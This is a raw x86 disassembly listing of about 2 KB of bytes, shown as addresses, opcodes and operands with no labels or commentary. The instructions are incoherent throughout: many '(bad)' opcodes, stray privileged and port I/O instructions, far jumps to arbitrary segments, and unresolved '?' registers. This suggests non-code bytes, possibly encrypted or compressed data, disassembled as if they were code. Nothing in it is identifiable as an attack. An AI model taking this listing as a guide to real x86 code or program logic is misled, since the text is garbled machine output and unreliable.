  410d04:	jno    0x410d19
  410d06:	and    eax,0x8e25abf5
  410d0b:	aad    0xd2
  410d0d:	xchg   ebx,eax
  410d0e:	in     eax,dx
  410d0f:	ds pop edi
  410d11:	pop    edx
  410d12:	sbb    edx,edi
  410d14:	gs sbb eax,0x6f1571e8
  410d1a:	inc    ebp
  410d1b:	and    ch,dl
  410d1d:	mov    ch,0x85
  410d1f:	imul   esi,esp,0xffffffd9
  410d22:	js     0x410d80
  410d24:	daa    
  410d25:	xor    dh,BYTE PTR [edi+0xa3acbec]
  410d2b:	adc    bl,BYTE PTR [eax]
  410d2d:	inc    BYTE PTR [ebp+0x3dfc4594]
  410d33:	into   
  410d34:	cmp    dl,BYTE PTR [ecx]
  410d36:	xchg   ebp,eax
  410d37:	dec    edx
  410d38:	stos   DWORD PTR es:[edi],eax
  410d39:	cmp    al,cl
  410d3b:	rcl    BYTE PTR [ebx],cl
  410d3d:	loop   0x410d2e
  410d3f:	les    ebp,FWORD PTR [eax-0x6a59f906]
  410d45:	push   ecx
  410d46:	inc    ebp
  410d47:	xor    BYTE PTR ds:0x94f8b47f,0x28
  410d4e:	stos   BYTE PTR es:[edi],al
  410d4f:	xchg   ebx,eax
  410d50:	mov    eax,0xf4f005fd
  410d55:	inc    eax
  410d56:	add    ebx,DWORD PTR [edx-0x716eebf6]
  410d5c:	cmc    
  410d5d:	mov    eax,ds:0x7cbfca1e
  410d62:	pop    edi
  410d63:	mov    fs,WORD PTR [ecx+0x22]
  410d66:	icebp  
  410d67:	mov    al,0x1b
  410d69:	(bad)  
  410d6a:	push   ebx
  410d6b:	jo     0x410d16
  410d6d:	dec    esp
  410d6e:	fcom   QWORD PTR [ebx-0x6e]
  410d71:	jmp    0x464d:0x8e734e8f
  410d78:	fcom   DWORD PTR [ecx]
  410d7a:	stos   DWORD PTR es:[edi],eax
  410d7b:	hlt    
  410d7c:	add    BYTE PTR [ecx],0x14
  410d7f:	retf   
  410d80:	int    0x3c
  410d82:	test   ah,ah
  410d84:	scas   eax,DWORD PTR es:[edi]
  410d85:	loop   0x410d77
  410d87:	pop    ss
  410d88:	bound  esp,QWORD PTR [ebx+0x111e18dd]
  410d8e:	push   esi
  410d8f:	fld    QWORD PTR [ebx]
  410d91:	push   es
  410d92:	push   0xffffffbc
  410d94:	test   bl,cl
  410d96:	test   ebx,edx
  410d98:	ja     0x410df9
  410d9a:	cwde   
  410d9b:	shr    BYTE PTR [esi],1
  410d9d:	mov    al,0xba
  410d9f:	mov    ?,WORD PTR [eax-0x2c]
  410da2:	jno    0x410d54
  410da4:	lods   al,BYTE PTR ds:[esi]
  410da5:	rcl    BYTE PTR [ebx+0x2d61d2cf],cl
  410dab:	ins    DWORD PTR es:[edi],dx
  410dac:	jle    0x410d46
  410dae:	push   eax
  410daf:	and    esp,edx
  410db1:	adc    DWORD PTR [eax],edi
  410db3:	lahf   
  410db4:	jl     0x410d50
  410db6:	jns    0x410dcf
  410db8:	out    dx,eax
  410db9:	xor    eax,0x9ebe3a85
  410dbe:	dec    ebp
  410dbf:	popa   
  410dc0:	js     0x410de5
  410dc2:	push   esi
  410dc3:	repnz into 
  410dc5:	adc    DWORD PTR [esi],esi
  410dc7:	add    al,0xa6
  410dc9:	push   ds
  410dca:	mov    DWORD PTR ds:0xd9853d2d,edi
  410dd0:	ret    
  410dd1:	or     BYTE PTR [edi],0xc6
  410dd4:	mov    dl,0x29
  410dd6:	lahf   
  410dd7:	mov    fs,eax
  410dd9:	ins    DWORD PTR es:[edi],dx
  410dda:	loop   0x410e1d
  410ddc:	jno    0x410df2
  410dde:	sub    esi,DWORD PTR [edx-0x2e]
  410de1:	jns    0x410dab
  410de3:	(bad)  
  410de5:	lods   al,BYTE PTR ds:[esi]
  410de6:	mov    ch,0x52
  410de8:	jo     0x410dbc
  410dea:	cmc    
  410deb:	rcl    BYTE PTR ss:[ebx+0x61],cl
  410def:	xchg   BYTE PTR [ebp-0x2d486917],bl
  410df5:	outs   dx,DWORD PTR ds:[esi]
  410df6:	add    al,BYTE PTR [ecx+0x600ee8a8]
  410dfc:	scas   al,BYTE PTR es:[edi]
  410dfd:	adc    DWORD PTR [eax+0x59],eax
  410e00:	std    
  410e01:	(bad)  
  410e02:	lods   eax,DWORD PTR ds:[esi]
  410e03:	lea    edi,[ecx+0x33]
  410e06:	out    dx,eax
  410e07:	ds xor al,0xdd
  410e0a:	test   DWORD PTR [ecx+0x67],ecx
  410e0d:	push   ebp
  410e0e:	imul   ebp,edi,0x3cca252a
  410e14:	ror    BYTE PTR [edx],cl
  410e16:	clc    
  410e17:	sti    
  410e18:	xchg   esp,eax
  410e19:	or     eax,DWORD PTR [ecx-0x7adcd86c]
  410e1f:	mov    esi,0xd0652452
  410e24:	mov    dh,0xc8
  410e26:	test   eax,0xd4155a60
  410e2b:	push   ebx
  410e2c:	pop    esi
  410e2d:	mov    eax,ds:0x77d2f6f1
  410e32:	inc    BYTE PTR [ecx+0x2b5db755]
  410e38:	shl    bl,cl
  410e3a:	push   esi
  410e3b:	outs   dx,DWORD PTR ds:[esi]
  410e3c:	addr16 das 
  410e3e:	adc    edx,DWORD PTR [esi-0x31]
  410e41:	leave  
  410e42:	and    DWORD PTR [ebx],edx
  410e44:	push   0x973e831e
  410e49:	xor    ebp,edi
  410e4b:	add    dh,BYTE PTR [edx]
  410e4d:	pop    edx
  410e4e:	test   BYTE PTR [esi],dh
  410e50:	inc    ebp
  410e51:	mov    ds:0x95c965aa,al
  410e56:	adc    DWORD PTR [esi+0x5d1f721e],ecx
  410e5c:	retf   
  410e5d:	imul   ebp,DWORD PTR [ebp+0x611cac80],0x59
  410e64:	xlat   BYTE PTR ds:[ebx]
  410e65:	adc    eax,0xc910eeae
  410e6a:	scas   eax,DWORD PTR es:[edi]
  410e6b:	lea    esi,[eax-0x39909d9e]
  410e71:	cli    
  410e72:	rcr    edx,1
  410e74:	fist   WORD PTR [esi+ecx*8]
  410e77:	dec    ebx
  410e78:	ror    BYTE PTR [edi],cl
  410e7a:	jge    0x410ed6
  410e7c:	dec    edi
  410e7d:	bound  ebp,QWORD PTR [ebx-0x1b]
  410e80:	mov    edx,0x9d958311
  410e85:	hlt    
  410e86:	sub    eax,0x85ca7718
  410e8b:	and    BYTE PTR [eax+0x3f],0xef
  410e8f:	nop
  410e90:	loope  0x410ece
  410e92:	ret    0xe864
  410e95:	adc    BYTE PTR [ecx+eiz*1-0x4d],bl
  410e99:	jl     0x410e65
  410e9b:	xchg   esi,eax
  410e9c:	mov    bl,ch
  410e9e:	arpl   WORD PTR [eax+0x5f],si
  410ea1:	inc    esi
  410ea2:	mov    WORD PTR [edi+edi*1-0x16df66aa],cs
  410ea9:	aam    0xe5
  410eab:	out    dx,al
  410eac:	inc    ebp
  410ead:	add    BYTE PTR [ebp+0x355fb54d],0xb7
  410eb4:	pushf  
  410eb5:	rcl    BYTE PTR [esi+ecx*4-0x623f4eb4],cl
  410ebc:	inc    ecx
  410ebd:	xor    al,0x50
  410ebf:	dec    eax
  410ec0:	rol    BYTE PTR [esi-0x29],cl
  410ec3:	enter  0xe6ac,0x24
  410ec7:	xor    DWORD PTR [edi+0x1e],ebx
  410eca:	in     eax,0x85
  410ecc:	(bad)  
  410ece:	inc    esi
  410ecf:	add    al,0xa2
  410ed1:	cmp    eax,DWORD PTR [ebp-0x7387169c]
  410ed7:	daa    
  410ed8:	cwde   
  410ed9:	loopne 0x410f42
  410edb:	mov    ?,esp
  410edd:	sub    edi,DWORD PTR [eax+0x2d86c152]
  410ee3:	jbe    0x410e96
  410ee5:	jge    0x410f0c
  410ee7:	js     0x410ebb
  410ee9:	lds    edx,FWORD PTR [edi+0x1aa628]
  410eef:	xchg   BYTE PTR [eax+0xf43ff11],bl
  410ef5:	pop    edi
  410ef6:	pop    edx
  410ef7:	(bad)  
  410ef8:	fstp   TBYTE PTR [esp+ebp*8-0x3bb5c4b9]
  410eff:	mov    WORD PTR [esi],ss
  410f01:	rol    edx,1
  410f03:	lods   al,BYTE PTR ds:[esi]
  410f04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f05:	and    eax,0x11a5832a
  410f0a:	scas   eax,DWORD PTR es:[di]
  410f0c:	fadd   DWORD PTR [ebp-0x6ed7d838]
  410f12:	test   DWORD PTR [ebx-0x931a444],ebx
  410f18:	popf   
  410f19:	loope  0x410ea4
  410f1b:	mov    cs,WORD PTR [edi]
  410f1d:	sar    DWORD PTR [ebx+eiz*4-0x6b],cl
  410f21:	xchg   edx,eax
  410f22:	dec    eax
  410f23:	jne    0x410f3b
  410f25:	inc    ebp
  410f26:	pushf  
  410f27:	mov    es,WORD PTR [edi+0x524febdf]
  410f2d:	mov    eax,ds:0xed8db84a
  410f32:	adc    BYTE PTR [edi-0x7d52960],0x52
  410f39:	test   eax,0x39ef04a5
  410f3e:	test   DWORD PTR [esp+eax*4],ebp
  410f41:	inc    esi
  410f42:	loope  0x410f2a
  410f44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f45:	mov    ebx,0x4a2d8eab
  410f4a:	data16 mov al,0xe1
  410f4d:	cmp    eax,0xc4d216fe
  410f52:	inc    ebp
  410f53:	fucomi st,st(3)
  410f55:	mov    al,0xa2
  410f57:	pop    eax
  410f58:	inc    esp
  410f59:	push   ds
  410f5a:	lds    eax,FWORD PTR [edi]
  410f5c:	(bad)  [edx+0x854a2ad]
  410f62:	mov    ch,BYTE PTR [edx-0x10]
  410f65:	dec    esi
  410f66:	out    0x89,eax
  410f68:	aaa    
  410f69:	shr    ebp,1
  410f6b:	jnp    0x410f81
  410f6d:	add    al,0x6
  410f6f:	mov    ah,0xfa
  410f71:	sbb    eax,0xb1c27cf3
  410f76:	lods   al,BYTE PTR ds:[esi]
  410f77:	or     DWORD PTR ds:0x6270dbc2,0xffffff9e
  410f7e:	or     BYTE PTR [edx+0x28],ch
  410f81:	push   ds
  410f82:	aam    0xe8
  410f84:	xchg   esp,eax
  410f85:	retf   0x2b1b
  410f88:	pusha  
  410f89:	and    DWORD PTR [ebp+0x7d7fcff9],eax
  410f8f:	lods   al,BYTE PTR ds:[esi]
  410f90:	lahf   
  410f91:	jp     0x410fd2
  410f93:	lea    eax,[esi]
  410f95:	loope  0x410ff7
  410f97:	and    ebp,DWORD PTR [ebx]
  410f99:	jnp    0x410fae
  410f9b:	aad    0xd2
  410f9d:	cmp    DWORD PTR [ecx],edx
  410f9f:	pop    es
  410fa0:	jg     0x410fa2
  410fa2:	mov    eax,0xe71105bd
  410fa7:	pop    ss
  410fa8:	lods   eax,DWORD PTR ds:[esi]
  410fa9:	mov    ecx,0xf3d5cf8e
  410fae:	test   DWORD PTR [edi-0x20],edi
  410fb1:	pop    edi
  410fb2:	ret    0xb894
  410fb5:	dec    edi
  410fb6:	add    BYTE PTR [ebp+ecx*8+0x11],ah
  410fba:	mov    edx,0xafb0dd9c
  410fbf:	and    DWORD PTR [edi+0x338585f7],0xe10a640d
  410fc9:	pop    edi
  410fca:	jp     0x410f5a
  410fcc:	mov    bl,bl
  410fce:	add    al,0xe8
  410fd0:	pop    edx
  410fd1:	int    0x60
  410fd3:	pop    ebx
  410fd4:	rol    BYTE PTR ds:0x749a548e,cl
  410fda:	push   edx
  410fdb:	(bad)  
  410fdc:	stc    
  410fdd:	adc    cl,bh
  410fdf:	jp     0x410f89
  410fe1:	mov    cl,0x6
  410fe3:	mov    edx,0xe6c8545
  410fe8:	lods   al,BYTE PTR ds:[esi]
  410fe9:	push   es
  410fea:	push   eax
  410feb:	loope  0x410fbe
  410fed:	loop   0x41102d
  410fef:	and    esi,ebp
  410ff1:	icebp  
  410ff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ff3:	(bad)  
  410ff4:	mov    cl,0xc9
  410ff6:	and    DWORD PTR [esp+ebx*4+0x36a70eba],ecx
  410ffd:	(bad)  
  410ffe:	(bad)  
  411001:	inc    ebp
  411002:	pop    edx
  411003:	stc    
  411004:	ror    BYTE PTR [ebx+0x37c9a316],cl
  41100a:	cmp    eax,0xb177e6c1
  41100f:	mov    ?,WORD PTR [ecx+eax*8]
  411012:	adc    BYTE PTR [edx+0x497f0dcd],cl
  411018:	ror    BYTE PTR [esi+0x7886276e],cl
  41101e:	ins    DWORD PTR es:[edi],dx
  41101f:	push   edi
  411020:	stos   DWORD PTR es:[edi],eax
  411021:	adc    DWORD PTR [edi],edx
  411023:	push   edx
  411024:	sbb    BYTE PTR cs:[edi-0x7a583e73],al
  41102b:	and    al,0x7e
  41102d:	sub    BYTE PTR [edx-0x71c4bf38],ch
  411033:	mov    ds,WORD PTR [edx-0x40]
  411036:	add    al,0x2f
  411038:	pop    ebp
  411039:	inc    ecx
  41103a:	jg     0x41102e
  41103c:	mov    ah,0x55
  41103e:	test   BYTE PTR [edx],dl
  411040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411041:	fistp  WORD PTR ds:0xe6c654e2
  411047:	mov    ?,WORD PTR [ebx-0x2b]
  41104a:	xor    cl,BYTE PTR [esi+eiz*2+0x77]
  41104e:	cmp    al,0xda
  411050:	lods   eax,DWORD PTR ds:[esi]
  411051:	imul   eax,DWORD PTR [ebp-0x503cbe15],0xe
  411058:	mov    ch,0x6e
  41105a:	xor    BYTE PTR [esi-0x5d3150d7],dl
  411060:	in     al,0x1
  411062:	frstor [edx+0x50]
  411065:	loopne 0x410fec
  411067:	mov    WORD PTR [edx],ds
  411069:	out    dx,al
  41106a:	out    dx,al
  41106b:	ja     0x4110a0
  41106d:	push   ebx
  41106e:	aam    0x8e
  411070:	mov    ebx,ds
  411072:	push   ss
  411073:	imul   DWORD PTR [esi-0x6d]
  411076:	lds    esi,FWORD PTR [edi+0x31815fd2]
  41107c:	cmp    al,0x4e
  41107e:	inc    edi
  41107f:	mov    bl,0xb9
  411081:	adc    DWORD PTR [ebp+0x2f],ebx
  411084:	xlat   BYTE PTR ds:[bx]
  411086:	nop
  411087:	xchg   BYTE PTR [ebx],cl
  411089:	mov    esp,0xd8dd6482
  41108e:	jo     0x41101e
  411090:	push   ds
  411091:	inc    ch
  411093:	xchg   ecx,eax
  411094:	sub    dl,BYTE PTR [ecx]
  411096:	xchg   edx,eax
  411097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411098:	mov    bl,0xb3
  41109a:	jb     0x411082
  41109c:	mov    BYTE PTR [ebp+eax*4-0x449e07ab],dh
  4110a3:	loopne 0x411060
  4110a5:	ja     0x411118
  4110a7:	mov    ds,WORD PTR [eax]
  4110a9:	sub    ch,BYTE PTR [esi-0x7c0c9cb]
  4110af:	pushf  
  4110b0:	sar    DWORD PTR [ecx],cl
  4110b2:	pop    eax
  4110b3:	test   BYTE PTR [edi],dh
  4110b5:	ins    DWORD PTR es:[edi],dx
  4110b6:	xchg   ebp,eax
  4110b7:	or     DWORD PTR [ebx+0xc1d6103],edx
  4110bd:	add    eax,0x51eec2e4
  4110c2:	(bad)  
  4110c3:	dec    ebx
  4110c4:	addr16 pop ss
  4110c6:	add    ah,BYTE PTR [edx-0x2e]
  4110c9:	sub    dh,BYTE PTR [ecx+0x58]
  4110cc:	mov    ebx,0xc4b58d4e
  4110d1:	adc    ebp,edx
  4110d3:	inc    BYTE PTR [esi+eax*1+0x3d]
  4110d7:	xchg   ecx,eax
  4110d8:	cmp    BYTE PTR [eax*4-0x672f1d60],ch
  4110df:	cmc    
  4110e0:	jmp    0x23c3:0xbd8cca4a
  4110e7:	pop    edx
  4110e8:	pop    ecx
  4110e9:	add    DWORD PTR [ebp+0x54],esp
  4110ec:	fcmove st,st(7)
  4110ee:	cld    
  4110ef:	mov    cl,0x99
  4110f1:	leave  
  4110f2:	fimul  WORD PTR [esi]
  4110f4:	test   DWORD PTR [ecx+0x46],ebx
  4110f7:	push   ebx
  4110f8:	lock add eax,0x51ab2e6e
  4110fe:	bound  edi,QWORD PTR [eax]
  411100:	inc    eax
  411101:	outs   dx,BYTE PTR ds:[esi]
  411102:	mov    ds:0x3c34d2b5,eax
  411107:	sub    ecx,DWORD PTR [ecx+esi*8]
  41110a:	mov    DWORD PTR [ebx+0x479d1035],0xe65ba37e
  411114:	bound  esi,QWORD PTR [esi+0x62d2fda7]
  41111a:	shr    BYTE PTR [bp+di+0x3294],1
  41111f:	cmp    eax,0x2a0811d9
  411124:	xor    DWORD PTR [ecx+0x30],esp
  411127:	sub    ecx,DWORD PTR [ebp+0x617785bd]
  41112d:	cwde   
  41112e:	xchg   DWORD PTR [edx-0x69],esi
  411131:	push   ebp
  411132:	shr    BYTE PTR [eax+0x5d8506f7],1
  411138:	sub    DWORD PTR [edx],edx
  41113a:	or     DWORD PTR [ebx+esi*8-0xa87ad0],0xffffffb5
  411142:	out    0x2c,eax
  411144:	ds dec esi
  411146:	dec    ebp
  411147:	bound  edi,QWORD PTR [eax-0xd1800f0]
  41114d:	call   0xa7cb72e7
  411152:	(bad)  
  411153:	call   0xece5d3c
  411158:	in     al,0xd9
  41115a:	xor    DWORD PTR [esi-0x71eb5a55],0xffffff93
  411161:	dec    edi
  411162:	outs   dx,DWORD PTR ds:[esi]
  411163:	outs   dx,BYTE PTR ds:[esi]
  411164:	in     al,dx
  411165:	int    0xbd
  411167:	push   0x4baa7d2
  41116c:	push   edx
  41116d:	or     al,0x90
  41116f:	imul   ebx,edx,0x11
  411172:	mov    ah,0x45
  411174:	ins    DWORD PTR es:[edi],dx
  411175:	aaa    
  411176:	inc    edx
  411177:	mov    cl,bh
  411179:	dec    edi
  41117a:	enter  0xd21d,0xe0
  41117e:	lock es (bad) 
  411181:	jg     0x4111aa
  411183:	adc    al,BYTE PTR [eax-0x36dc82ef]
  411189:	pushf  
  41118a:	add    eax,0x8ac4400c
  41118f:	sbb    eax,DWORD PTR [esi+0x1f339026]
  411195:	mov    bh,BYTE PTR [ecx+0x571e7399]
  41119b:	jg     0x411125
  41119d:	bound  esi,QWORD PTR [ebp+0x48]
  4111a0:	lock pop esi
  4111a2:	jmp    0xc6243bc7
  4111a7:	xor    BYTE PTR [esi+0x14],dh
  4111aa:	bound  esi,QWORD PTR [ecx-0x4a]
  4111ad:	or     DWORD PTR gs:[ecx-0x7f3333cd],edx
  4111b4:	and    edx,DWORD PTR [ecx+0x14ec9a9]
  4111ba:	iret   
  4111bb:	jbe    0x41118f
  4111bd:	or     al,0x9b
  4111bf:	scas   al,BYTE PTR es:[edi]
  4111c0:	call   0x1b3f:0x956f5b52
  4111c7:	inc    edx
  4111c8:	loop   0x4111ee
  4111ca:	mov    BYTE PTR [edx+ecx*8+0x3c],dh
  4111ce:	adc    al,0x64
  4111d0:	shl    DWORD PTR [ebp-0x44],cl
  4111d3:	iret   
  4111d4:	imul   ebp,DWORD PTR [edx],0xffffff9a
  4111d7:	pop    ebp
  4111d8:	mov    ss,WORD PTR [esi+0x3]
  4111db:	test   eax,0xb805c857
  4111e0:	push   ebx
  4111e1:	shl    BYTE PTR [esi+0x1a],0x85
  4111e5:	jno    0x41116b
  4111e7:	mov    ds:0xd62d3d73,eax
  4111ec:	les    eax,FWORD PTR [ebp+0x513d8e5e]
  4111f2:	sbb    ch,dh
  4111f4:	out    dx,eax
  4111f5:	xchg   edi,eax
  4111f6:	and    al,0x1f
  4111f8:	shl    bl,cl
  4111fa:	ret    
  4111fb:	ds inc ebx
  4111fd:	jb     0x411231
  4111ff:	scas   eax,DWORD PTR es:[edi]
  411200:	fwait
  411201:	sbb    al,0x3a
  411203:	cmp    bl,0x4f
  411206:	lods   al,BYTE PTR ds:[esi]
  411207:	dec    eax
  411208:	test   eax,0xfddd0c55
  41120d:	test   DWORD PTR [ebp-0xa],ebp
  411210:	mov    edi,0xf3ee85d2
  411215:	nop
  411216:	mov    al,0xd8
  411218:	ins    DWORD PTR es:[edi],dx
  411219:	out    0xba,al
  41121b:	mov    ?,ecx
  41121d:	fst    QWORD PTR [esi]
  41121f:	or     esi,DWORD PTR cs:[edx-0x6b2d1f4c]
  411226:	lds    eax,FWORD PTR [ecx+eiz*1+0x3c]
  41122a:	xchg   DWORD PTR [ebx-0x83a72ac],ecx
  411230:	jns    0x4111d9
  411232:	mov    WORD PTR [esi-0x7d],ds
  411235:	adc    eax,edx
  411237:	xchg   BYTE PTR ss:[esi],bl
  41123a:	jl     0x411291
  41123c:	push   0x988e4bae
  411241:	sub    eax,DWORD PTR [ecx+0x2f]
  411244:	fadd   st,st(1)
  411246:	inc    esi
  411247:	xor    al,0xd2
  411249:	arpl   si,dx
  41124b:	or     eax,0x12995fe
  411250:	inc    ebx
  411251:	push   ds
  411252:	jnp    0x4111fc
  411254:	and    al,BYTE PTR [ecx-0x1f]
  411257:	fist   WORD PTR [edi-0x4e]
  41125a:	stc    
  41125b:	inc    esi
  41125c:	shr    DWORD PTR [edx+0x2d],cl
  41125f:	scas   eax,DWORD PTR es:[edi]
  411260:	mov    dl,0xee
  411262:	iret   
  411263:	mov    ?,WORD PTR [ecx-0x1b]
  411266:	sub    al,BYTE PTR [bp+di]
  411269:	adc    BYTE PTR [ebp+0x7b1ad270],0xac
  411270:	cmpxchg edi,ebp
  411273:	loop   0x411271
  411275:	sbb    al,0x58
  411277:	mov    al,ds:0xae4e04a3
  41127c:	dec    ebp
  41127d:	(bad)  
  41127e:	mov    esp,0x49b7d2de
  411283:	xor    al,BYTE PTR [ecx+0x6ac82918]
  411289:	push   ds
  41128a:	add    bh,bl
  41128c:	dec    ecx
  41128d:	push   edi
  41128e:	or     eax,0x85828295
  411293:	stos   DWORD PTR es:[edi],eax
  411294:	xor    ebp,DWORD PTR [eax-0x8b71078]
  41129a:	jae    0x41122b
  41129c:	fisub  WORD PTR [ebx+edx*4]
  41129f:	call   0x20c6e90b
  4112a4:	sbb    BYTE PTR [ecx],bl
  4112a6:	or     eax,0x85bc8a46
  4112ab:	ret    0xb341
  4112ae:	ja     0x411263
  4112b0:	jl     0x4112e7
  4112b2:	lods   al,BYTE PTR ds:[esi]
  4112b3:	mov    cs,WORD PTR [ebx+0x1a]
  4112b6:	mov    eax,cr0
  4112b9:	out    0x47,al
  4112bb:	add    al,0xd2
  4112bd:	xor    ebx,DWORD PTR [edi-0x4fbef5a6]
  4112c3:	and    DWORD PTR [ebx],0x288dffe5
  4112c9:	lods   al,BYTE PTR ds:[esi]
  4112ca:	pop    ecx
  4112cb:	jns    0x41128a
  4112cd:	imul   edi,DWORD PTR [esi],0xffffffad
  4112d0:	fdiv   DWORD PTR [edi-0x73be187b]
  4112d6:	xchg   dl,cl
  4112d8:	inc    esi
  4112d9:	or     BYTE PTR [edx+ebp*4],bl
  4112dc:	hlt    
  4112dd:	push   ebp
  4112de:	test   al,0x31
  4112e0:	aas    
  4112e1:	add    ah,BYTE PTR [esi]
  4112e3:	jmp    0x411268
  4112e5:	pushf  
  4112e6:	clc    
  4112e7:	rcl    BYTE PTR [edx-0x6d293720],cl
  4112ed:	shr    DWORD PTR [edi+ebp*8-0x2e],0x6b
  4112f2:	jb     0x4112bc
  4112f4:	shl    ebx,1
  4112f6:	adc    eax,0x6b11a743
  4112fb:	sbb    BYTE PTR [edi+0x5909d794],0xc8
  411302:	test   DWORD PTR [ecx-0x34],ebx
  411305:	push   cs
  411306:	or     al,0xb1
  411308:	js     0x411363
  41130a:	call   0x50fe:0x317cc98e
  411311:	mov    ds:0xe7d26be5,al
  411316:	imul   ecx,ebp,0xffffff9b
  411319:	dec    ebp
  41131a:	clc    
  41131b:	in     eax,dx
  41131c:	clc    
  41131d:	adc    DWORD PTR [eax+0x13c0895d],esi
  411323:	xchg   ecx,eax
  411324:	dec    ebp
  411325:	mov    WORD PTR [ebp+0x34c47d8a],es
  41132b:	xor    al,0xb7
  41132d:	in     al,dx
  41132e:	mov    cs,WORD PTR [esi+0x1e93598f]
  411334:	pop    ebx
  411335:	adc    eax,0x42b422d1
  41133a:	test   BYTE PTR [ebp+0x29],cl
  41133d:	fisub  DWORD PTR [ecx+0x1fdb47f8]
  411343:	lahf   
  411344:	(bad)  
  411345:	es or  al,0x21
  411348:	icebp  
  411349:	popa   
  41134a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41134b:	test   eax,0x3c1ae35d
  411350:	rcl    al,cl
  411352:	mov    ecx,0xf749cf00
  411357:	outs   dx,BYTE PTR ds:[esi]
  411358:	jno    0x411378
  41135a:	pop    esp
  41135b:	test   BYTE PTR [esi-0x49d5faa],bl
  411361:	xor    ecx,DWORD PTR [ecx+0x5511850e]
  411367:	call   0x7a59095
  41136c:	aaa    
  41136d:	adc    DWORD PTR [ebx-0x6b],esi
  411370:	push   ecx
  411371:	add    ebp,0xffffffd5
  411374:	lods   eax,DWORD PTR ds:[esi]
  411375:	cmp    BYTE PTR [edx+0x638a83f0],cl
  41137b:	jge    0x4113ae
  41137d:	test   BYTE PTR [esi+ebp*8-0x7e],cl
  411381:	pop    ecx
  411382:	or     BYTE PTR [esi-0x59078fd1],0xa5
  411389:	and    al,BYTE PTR [edx+0x7f23d233]
  41138f:	push   ecx
  411390:	mov    al,ds:0xddbb6717
  411395:	sbb    al,0x91
  411397:	rcr    BYTE PTR [esi+0x72],1
  41139a:	inc    esp
  41139b:	sbb    BYTE PTR [eax-0x2aa5fbb1],dh
  4113a1:	fsub   DWORD PTR [ebp+0x1f]
  4113a4:	rcl    DWORD PTR [ecx+0x1292b594],0xf5
  4113ab:	add    BYTE PTR ds:0x5c8e8065,ah
  4113b1:	and    eax,0xbb68733e
  4113b6:	test   DWORD PTR fs:[ebp+0x4bccdfc4],ebp
  4113bd:	loope  0x4113c1
  4113bf:	(bad)  
  4113c0:	adc    esp,esp
  4113c2:	enter  0x7b8e,0x41
  4113c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113c7:	cdq    
  4113c8:	mov    ecx,0xe6db2b3b
  4113cd:	stos   DWORD PTR es:[edi],eax
  4113ce:	inc    ebx
  4113cf:	mov    ?,WORD PTR [ebx+0x76]
  4113d2:	jl     0x411358
  4113d4:	or     BYTE PTR [edx],0x6e
  4113d7:	mov    ds,WORD PTR ds:0xb7e7ee2b
  4113dd:	jp     0x411399
  4113df:	call   0xe2159493
  4113e4:	sahf   
  4113e5:	pop    edx
  4113e6:	pop    es
  4113e7:	jle    0x4113fb
  4113e9:	iret   
  4113ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113eb:	imul   ecx,DWORD PTR [eax],0x32d94011
  4113f1:	retf   0xfcf1
  4113f4:	add    eax,0x578388c1
  4113f9:	lods   eax,DWORD PTR ds:[esi]
  4113fa:	pop    edx
  4113fb:	aas    
  4113fc:	mov    ebx,0xb6a7c159
  411401:	adc    DWORD PTR [eax+0xd4819c],ecx
  411407:	in     eax,dx
  411408:	retf   
  411409:	or     BYTE PTR [edx+ebx*2+0xba42973],al
  411410:	add    al,0xfc
  411412:	pushf  
  411413:	mov    es,WORD PTR [edi+0x3c]
  411416:	add    al,0xaa
  411418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411419:	mov    edi,0xebad9240
  41141e:	pop    eax
  41141f:	in     eax,dx
  411420:	lods   al,BYTE PTR ds:[esi]
  411422:	mov    ch,ch
  411424:	jnp    0x41145b
  411426:	gs jne 0x41146c
  411429:	push   ds
  41142a:	xor    al,0x50
  41142c:	daa    
  41142d:	xchg   ebp,eax
  41142e:	imul   ebp,eax,0x1885254b
  411434:	xchg   esp,eax
  411435:	jmp    0xffe9c573
  41143a:	aam    0x8d
  41143c:	push   esp
  41143d:	fwait
  41143e:	scas   eax,DWORD PTR es:[edi]
  41143f:	dec    ebx
  411440:	pop    ss
  411441:	arpl   WORD PTR [eax-0x67aacc2e],dx
  411447:	dec    edi
  411448:	sahf   
  411449:	inc    eax
  41144a:	test   ah,bh
  41144c:	dec    edi
  41144d:	cmp    al,0xa2
  41144f:	inc    ecx
  411450:	mov    BYTE PTR [edi-0x6],ch
  411453:	mov    ?,WORD PTR [ebx+0x43192258]
  411459:	repz fidiv DWORD PTR [edx+edx*8-0x15ea60fb]
  411461:	jb     0x9d5235ef
  411467:	cmp    eax,0xf2a5ae09
  41146c:	out    0xcf,eax
  41146e:	and    eax,0xfc2fcae5
  411473:	add    ah,BYTE PTR [edx]
  411475:	cmc    
  411476:	test   BYTE PTR [esi],cl
  411478:	call   0x7a70736d
  41147d:	push   ds
  41147e:	cli    
  41147f:	lahf   
  411480:	push   edx
  411481:	sbb    DWORD PTR [ebx-0x7a3ae3d0],ebp
  411487:	repnz mov eax,0x8406810d
  41148d:	push   ebx
  41148e:	ror    BYTE PTR [esi+0xec6eb2c],1
  411494:	adc    DWORD PTR [ebx+0x2fd0293e],ebx
  41149a:	xchg   eax,esi
  41149c:	jnp    0x4114c1
  41149e:	das    
  41149f:	aaa    
  4114a0:	rcr    bl,cl
  4114a2:	adc    DWORD PTR [edi-0x75767602],esp
  4114a8:	xor    BYTE PTR [edi+esi*2+0x13],dl
  4114ac:	shl    BYTE PTR [eax+0x79a3d947],0x83
  4114b3:	mov    BYTE PTR [eax-0x2cda9fa8],0xa1
  4114ba:	and    BYTE PTR [edx-0x6d],bh
  4114bd:	mov    ah,BYTE PTR [esi]
  4114bf:	imul   esi,DWORD PTR [edx],0x28
  4114c2:	jmp    0x411452
  4114c4:	xchg   edi,eax
  4114c5:	or     DWORD PTR [eax],ebp
  4114c7:	xchg   esi,eax
  4114c8:	enter  0x856e,0x82
  4114cc:	sar    BYTE PTR [ecx-0x71],cl
  4114cf:	adc    BYTE PTR [ebx+0xe],ah
  4114d2:	cwde   
  4114d3:	jg     0x411492
  4114d5:	jnp    0x41150a
  4114d7:	test   eax,0x8ed1bc99
  4114dc:	icebp  
  4114dd:	(bad)  
